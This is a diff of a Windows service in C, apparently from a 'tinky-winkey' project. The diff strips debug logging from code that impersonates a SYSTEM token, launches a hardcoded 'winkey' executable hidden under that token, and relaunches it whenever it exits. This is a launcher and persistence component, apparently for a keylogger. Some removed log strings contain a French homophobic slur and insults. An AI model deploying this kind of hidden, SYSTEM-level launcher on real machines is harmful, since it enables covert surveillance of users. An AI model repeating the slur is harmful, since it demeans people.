@@ -15,36 +15,13 @@ static HANDLE gStopEvent = NULL;
 static HANDLE gSystemToken = NULL;
 static HANDLE gChildProc = NULL;
 
-#include <shlobj.h>
-
-static void AppendLog(const wchar_t* fmt, ...)
-{
-    CreateDirectoryW(L"C:\\Temp", NULL);
-    HANDLE h = CreateFileW(L"C:\\Temp\\svc_trace.log",
-                           FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE,
-                           NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h == INVALID_HANDLE_VALUE) return;
-
-    wchar_t line[1024];
-    va_list ap; va_start(ap, fmt);
-    _vsnwprintf_s(line, _countof(line), _TRUNCATE, fmt, ap);
-    va_end(ap);
-
-    wchar_t out[1100];
-    _snwprintf_s(out, _countof(out), _TRUNCATE, L"%s\r\n", line);
-
-    DWORD bytes = 0;
-    WriteFile(h, out, (DWORD)(lstrlenW(out) * sizeof(wchar_t)), &bytes, NULL);
-    CloseHandle(h);
-}
-
 static void LogWinErr(const wchar_t* where)
 {
+    (void)where;
     DWORD e = GetLastError();
     wchar_t msg[512];
     FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,
                    NULL, e, 0, msg, _countof(msg), NULL);
-    AppendLog(L"[ERR] %s failed (%lu): %s", where, e, msg);
 }
 
 static void LogLastErr(const wchar_t* where) {
@@ -57,28 +34,19 @@ static void LogLastErr(const wchar_t* where) {
 
 static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HANDLE* outProc)
 {
-    AppendLog(L"--- RunHiddenConsole start ---");
-    AppendLog(L"exePath='%s'", exePath ? exePath : L"(null)");
-    AppendLog(L"args   ='%s'", args ? args : L"(none)");
-
-    if (!exePath || !*exePath) { AppendLog(L"[ERR] exePath empty"); return FALSE; }
-
     DWORD attr = GetFileAttributesW(exePath);
     if (attr == INVALID_FILE_ATTRIBUTES || (attr & FILE_ATTRIBUTE_DIRECTORY)) {
-        AppendLog(L"[ERR] exe introuvable ou est un répertoire");
         return FALSE;
     }
 
     wchar_t cmd[1024];
     if (args && *args) _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\" %s", exePath, args);
     else               _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, L"\"%s\"",   exePath);
-    AppendLog(L"cmdline='%s'", cmd);
 
     wchar_t workdir[MAX_PATH];
     wcsncpy_s(workdir, _countof(workdir), exePath, _TRUNCATE);
     wchar_t* last = wcsrchr(workdir, L'\\');
     if (last) *last = L'\0';
-    AppendLog(L"workdir='%s'", workdir);
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE }; 
     CreateDirectoryW(L"C:\\Temp", NULL);
@@ -86,7 +54,6 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
     HANDLE hLog = CreateFileW(logFile, GENERIC_WRITE, FILE_SHARE_READ,
                               &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hLog == INVALID_HANDLE_VALUE) { LogWinErr(L"CreateFile(log)"); return FALSE; }
-    AppendLog(L"stdout/stderr -> %s", logFile);
 
     HANDLE hNullIn = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE,
                                  &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -102,7 +69,6 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
     PROCESS_INFORMATION pi = {0};
 
     DWORD flags = CREATE_NO_WINDOW;
-    AppendLog(L"CreateProcessW...");
     BOOL ok = CreateProcessW(
         exePath,
         cmd,
@@ -119,23 +85,12 @@ static BOOL RunHiddenConsole(LPCWSTR exePath, LPCWSTR args, LPCWSTR logPath, HAN
 
     if (!ok) {
         LogWinErr(L"CreateProcessW");
-        AppendLog(L"--- RunHiddenConsole end (FAIL) ---");
         return FALSE;
-    }
-
-    DWORD code = 0;
-    if (GetExitCodeProcess(pi.hProcess, &code)) {
-        if (code == STILL_ACTIVE) {
-            AppendLog(L"[OK] child lancé, PID=%lu", (unsigned long)pi.dwProcessId);
-        } else {
-            AppendLog(L"[WARN] child a quitté immédiatement. ExitCode=%lu", code);
-        }
     }
 
     if (outProc) *outProc = pi.hProcess; else CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
-    AppendLog(L"--- RunHiddenConsole end (OK) ---");
     return TRUE;
 }
 
@@ -179,20 +134,16 @@ static VOID WINAPI CtrlHandler(DWORD ctrl)
 
 static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
 {
-    AppendLog(L"--- RunWinkeyAsSystem start ---");
     
     if (!hSystemToken) {
-        AppendLog(L"[ERR] Token système requis");
         return FALSE;
     }
 
     wchar_t cmd[1024];
     _snwprintf_s(cmd, _countof(cmd), _TRUNCATE, 
                  L"\"%s\"", L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey\\main.exe");
-    AppendLog(L"cmdline='%s'", cmd);
 
     wchar_t workdir[] = L"C:\\Users\\meter\\Code\\tinky-winkey\\winkey";
-    AppendLog(L"workdir='%s'", workdir);
 
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
     CreateDirectoryW(L"C:\\Temp", NULL);
@@ -238,23 +189,12 @@ static BOOL RunWinkeyAsSystem(HANDLE hSystemToken, HANDLE* outProc)
 
     if (!ok) {
         LogWinErr(L"CreateProcessAsUserW");
-        AppendLog(L"--- RunWinkeyAsSystem end (FAIL) ---");
         return FALSE;
-    }
-
-    DWORD code = 0;
-    if (GetExitCodeProcess(pi.hProcess, &code)) {
-        if (code == STILL_ACTIVE) {
-            AppendLog(L"[OK] winkey lancé avec token système, PID=%lu", (unsigned long)pi.dwProcessId);
-        } else {
-            AppendLog(L"[WARN] winkey a quitté immédiatement. ExitCode=%lu", code);
-        }
     }
 
     if (outProc) *outProc = pi.hProcess; else CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
-    AppendLog(L"--- RunWinkeyAsSystem end (OK) ---");
     return TRUE;
 }
 
@@ -265,15 +205,12 @@ static DWORD WINAPI Worker(LPVOID lpParam)
 
     if (hTok) {
         didImpersonate = ImpersonateLoggedOnUser(hTok);
-        AppendLog(L"Impersonation avec token système: %s", didImpersonate ? L"OK" : L"ECHEC");
     }
 
     RunWinkeyAsSystem(hTok, &gChildProc);
 
-    AppendLog(L"nique les pd qui parle en scred\n\n");
     while (WaitForSingleObject(gStopEvent, 2000) == WAIT_TIMEOUT) {
         if (gChildProc) {
-            AppendLog(L"si le savoir est une arme et ben ntm\n\n");
             DWORD code = 0;
             if (GetExitCodeProcess(gChildProc, &code) && code != STILL_ACTIVE) {
                 // relancer winkey avec le token système :
